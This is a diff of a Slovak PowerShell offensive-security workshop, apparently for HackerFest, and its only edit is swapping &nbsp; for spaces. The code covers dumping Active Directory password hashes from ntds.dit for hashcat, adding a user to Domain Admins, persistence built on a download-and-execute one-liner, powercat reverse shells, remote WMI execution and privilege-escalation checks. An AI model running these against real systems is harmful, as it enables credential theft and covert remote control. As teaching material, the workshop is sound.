@@ -53,7 +53,7 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 Install-Module -Name DSInternals -Scope CurrentUser -Force
 Import-Module -Name DSInternals
 
-# Vytvoríme si&nbsp;pomocný adresár
+# Vytvoríme si pomocný adresár
 $targetFolder = 'C:\HackerFest\ActiveDirectory'
 mkdir -Path $targetFolder -Force
 
@@ -62,7 +62,7 @@ Manuálny krok: Stiahnite a&nbsp;rozbaľte súbor ntds.zip z&nbsp;adresy
 https://1drv.ms/f/s!Ah1NVj_AudV4iZ1M_EF6HUu1dLT9KA do&nbsp;C:\HackerFest\ActiveDirectory
 #>
 
-# Zobrazenie informácií o&nbsp;databáze
+# Zobrazenie informácií o databáze
 $dbFile = Join-Path $targetFolder ntds.dit
 $dcInfo = Get-ADDBDomainController -DBPath $dbFile
 $dcInfo
@@ -70,7 +70,7 @@ $dcInfo
 # Zobrazenie zoznamu používateľov
 Get-ADDBAccount -All -DBPath $dbFile | Out-GridView
 
-# Načítanie SysKey z&nbsp;registrov
+# Načítanie SysKey z registrov
 $regFile = Join-Path $targetFolder SYSTEM
 $sysKey = Get-SysKey -SystemHiveFilePath $regFile
 $sysKey
@@ -78,10 +78,10 @@ $sysKey
 # Dešifrovanie hashov hesla
 Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile -SysKey $sysKey
 
-# Export hashov hesiel pre&nbsp;oclHashcat
+# Export hashov hesiel pre oclHashcat
 Get-ADDBAccount -All -DBPath $dbFile -SysKey $sysKey | Format-Custom -View HashcatNT
 
-# Zakázanie a&nbsp;povolenie účtu
+# Zakázanie a povolenie účtu
 Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled
 Disable-ADDBAccount -SamAccountName Administrator -DBPath $dbFile
 Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled
@@ -89,7 +89,7 @@ Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccoun
 Enable-ADDBAccount -SamAccountName Administrator -DBPath $dbFile
 Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled
 
-<# Zmena členstva v&nbsp;primárnej skupine Potrebujeme zoznam dobre známych RIDov: https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems Napríklad: 512 Domain Admins 513 Domain Users 515 Domain Computers 516 Domain Controllers 519 Enterprise Admins #>
+<# Zmena členstva v primárnej skupine Potrebujeme zoznam dobre známych RIDov: https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems Napríklad: 512 Domain Admins 513 Domain Users 515 Domain Computers 516 Domain Controllers 519 Enterprise Admins #>
 Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile | select SamAccountName,PrimaryGroupId
 Set-ADDBPrimaryGroup -SamAccountName Wendy -PrimaryGroupId 512 -DBPath $dbFile
 Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile | select SamAccountName,PrimaryGroupId
@@ -167,7 +167,7 @@ $Rickroll = { iex (iwr https://bit.ly/e0Mw9w ) }
 $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
 $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
 
-# Vygenerujeme inštalačný a&nbsp;odinštalačný skript na&nbsp;plánovanú úlohu
+# Vygenerujeme inštalačný a odinštalačný skript na plánovanú úlohu
 Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1
 ```
 
@@ -246,7 +246,7 @@ Add-Type -MemberDefinition $signature `
          -Namespace Win32Utils `
          -Using System.Text
 
-# Zabalíme do&nbsp;PowerShell funkcie
+# Zabalíme do PowerShell funkcie
 
 function Get-PrivateProfileString
 {
@@ -273,10 +273,11 @@ Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
 
 Znovu sledujte aktivitu PowerShellu pomocou nástroja ProcMon.
 ```powershell
-# Stiahneme skript Invoke-WindowsApi.ps1, ale&nbsp;neuložíme ho&nbsp;$script = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hsmalley/Powershell/master/Invoke-WindowsApi.ps1'
+# Stiahneme skript Invoke-WindowsApi.ps1, ale neuložíme ho
+$script = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hsmalley/Powershell/master/Invoke-WindowsApi.ps1'
 $scriptBlock = [Scriptblock]::Create($script.Content)
 
-# Obalíme ho&nbsp;funkciou s&nbsp;definíciou signatúry
+# Obalíme ho funkciou s definíciou signatúry
 function Get-PrivateProfileString2
 {
 param( 
@@ -284,7 +285,7 @@ param(
     [string] $category, 
     [string] $Key)
 
-## Prepare the&nbsp;parameter types and&nbsp;parameter values for&nbsp;the&nbsp;Invoke-WindowsApi script 
+## Prepare the parameter types and parameter values for the Invoke-WindowsApi script 
 $returnValue = New-Object System.Text.StringBuilder 500 
 $parameterTypes = [string], [string], [string], [System.Text.StringBuilder], [int], [string] 
 $parameters = $Category,
@@ -293,11 +294,11 @@ $parameters = $Category,
               [System.Text.StringBuilder] $returnValue,
               [int] $returnValue.Capacity,
               $File
-## Invoke the&nbsp;API 
+## Invoke the API 
 # [void] (Invoke-WindowsApi "kernel32.dll" ([UInt32]) "GetPrivateProfileString" $parameterTypes $parameters)
 Invoke-Command -ScriptBlock $scriptBlock -ArgumentList 'kernel32.dll',([UInt32]),'GetPrivateProfileString',$parameterTypes,$parameters > $null
 
-## And&nbsp;return the&nbsp;results 
+## And return the results 
 $returnValue.ToString()
 }
 
@@ -380,7 +381,7 @@ powercat -l -p 8000
 # Spustenie klienta
 powercat -c 10.0.0.1 -p 8000
 
-# Spustenie klienta v&nbsp;režime PowerShell
+# Spustenie klienta v režime PowerShell
 powercat -c 10.0.0.1 -p 8000 -ep
 
 # Vygenerovanie reverzného TCP payloadu
@@ -397,7 +398,7 @@ powercat -c 10.0.0.1 -p 10000 -ep -ge
 
 Znovu použijeme PowerSploit
 ```powershell
-Invoke-WmiCommand -Payload { if&nbsp;($True) { 'Do Evil' } } -ComputerName '10.10.1.1'
+Invoke-WmiCommand -Payload { if($True) { 'Do Evil' } } -ComputerName '10.10.1.1'
 ```
 
 ## Spustenie natívneho kódu v&nbsp;inom procese
@@ -417,22 +418,22 @@ Subvert-PE -Path 'C:\Program Files\Notepad++\notepad++.exe' -Write
 
 ## Eskalácia oprávnení
 ```powershell
-# returns services with unquoted paths that&nbsp;also have a&nbsp;space in&nbsp;the&nbsp;name
+# returns services with unquoted paths that also have a space in the name
 Get-ServiceUnquoted
 
-# returns services where&nbsp;the&nbsp;current user can write to&nbsp;the service binary path or&nbsp;its config
+# returns services where the current user can write to the service binary path or its config
 Get-ModifiableServiceFile
 
-# returns services the&nbsp;current user can modify
+# returns services the current user can modify
 Get-ModifiableService
 
 # find schtasks with modifiable target files
 Get-ModifiableScheduledTaskFile
 
-# checks for&nbsp;any modifiable binaries/scripts (or their configs) in&nbsp;HKLM autoruns
+# checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
 Get-ModifiableRegistryAutoRun
 
-# finds potential DLL hijacking opportunities for&nbsp;currently running processes
+# finds potential DLL hijacking opportunities for currently running processes
 Find-ProcessDLLHijack
 ```
 
